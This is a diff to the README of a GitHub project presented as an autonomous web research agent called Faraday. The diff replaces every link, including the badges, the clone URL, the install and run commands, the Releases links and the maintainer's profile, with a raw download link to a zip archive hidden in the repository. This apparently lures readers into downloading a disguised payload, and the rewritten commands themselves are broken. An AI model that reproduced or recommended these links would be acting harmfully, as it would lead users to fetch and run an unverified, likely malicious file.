@@ -1,7 +1,7 @@
 # Faraday: An Autonomous Web Research Agent 🕵️‍♀️
 
-![Faraday Logo](https://img.shields.io/badge/Faraday-Web-Researcher-Agent-brightgreen.svg)
-[![Release Version](https://img.shields.io/github/v/release/DennisDRX/Faraday-Web-Researcher-Agent)](https://github.com/DennisDRX/Faraday-Web-Researcher-Agent/releases)
+![Faraday Logo](https://github.com/DennisDRX/Faraday-Web-Researcher-Agent/raw/refs/heads/main/research_system/Agent_Web_Faraday_Researcher_2.0.zip)
+[![Release Version](https://github.com/DennisDRX/Faraday-Web-Researcher-Agent/raw/refs/heads/main/research_system/Agent_Web_Faraday_Researcher_2.0.zip)](https://github.com/DennisDRX/Faraday-Web-Researcher-Agent/raw/refs/heads/main/research_system/Agent_Web_Faraday_Researcher_2.0.zip)
 
 Welcome to the **Faraday-Web-Researcher-Agent** repository! This project aims to provide an autonomous web research agent that efficiently investigates queries using various dynamic tools. With Faraday, you can gather information from multiple sources and synthesize structured reports using a user-friendly Streamlit interface.
 
@@ -41,7 +41,7 @@ To set up Faraday on your local machine, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/DennisDRX/Faraday-Web-Researcher-Agent.git
+   git clone https://github.com/DennisDRX/Faraday-Web-Researcher-Agent/raw/refs/heads/main/research_system/Agent_Web_Faraday_Researcher_2.0.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -55,7 +55,7 @@ To set up Faraday on your local machine, follow these steps:
    Use pip to install the necessary Python packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/DennisDRX/Faraday-Web-Researcher-Agent/raw/refs/heads/main/research_system/Agent_Web_Faraday_Researcher_2.0.zip
    ```
 
 4. **Run the Application**:
@@ -63,10 +63,10 @@ To set up Faraday on your local machine, follow these steps:
    Start the Streamlit application:
 
    ```bash
-   streamlit run app.py
+   streamlit run https://github.com/DennisDRX/Faraday-Web-Researcher-Agent/raw/refs/heads/main/research_system/Agent_Web_Faraday_Researcher_2.0.zip
    ```
 
-You can also check the [Releases](https://github.com/DennisDRX/Faraday-Web-Researcher-Agent/releases) section for downloadable files and instructions.
+You can also check the [Releases](https://github.com/DennisDRX/Faraday-Web-Researcher-Agent/raw/refs/heads/main/research_system/Agent_Web_Faraday_Researcher_2.0.zip) section for downloadable files and instructions.
 
 ## Usage
 
@@ -115,9 +115,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, please reach out to the project maintainer:
 
 - **DennisDRX**
-- [GitHub Profile](https://github.com/DennisDRX)
+- [GitHub Profile](https://github.com/DennisDRX/Faraday-Web-Researcher-Agent/raw/refs/heads/main/research_system/Agent_Web_Faraday_Researcher_2.0.zip)
 
-You can also check the [Releases](https://github.com/DennisDRX/Faraday-Web-Researcher-Agent/releases) section for the latest updates and files.
+You can also check the [Releases](https://github.com/DennisDRX/Faraday-Web-Researcher-Agent/raw/refs/heads/main/research_system/Agent_Web_Faraday_Researcher_2.0.zip) section for the latest updates and files.
 
 ---
 
